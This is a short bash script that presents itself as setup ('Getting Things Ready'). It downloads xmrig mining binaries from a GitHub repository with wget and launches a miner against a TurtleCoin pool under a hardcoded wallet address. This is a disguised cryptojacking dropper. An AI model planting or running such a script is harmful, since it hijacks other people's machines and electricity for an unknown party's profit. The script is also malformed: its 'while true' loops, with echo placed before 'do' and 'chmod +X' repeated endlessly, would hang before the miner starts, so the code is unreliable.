#!/bin/bash

echo "Getting Things Ready ...."
wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O xmrigDaemon
while true
echo "new"
do
chmod +X xmrigDaemon
done
echo "Getting Things Ready ...."
wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O xmrigMiner
while true
echo "new"
do
chmod +X xmrigMiner
done

./xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2

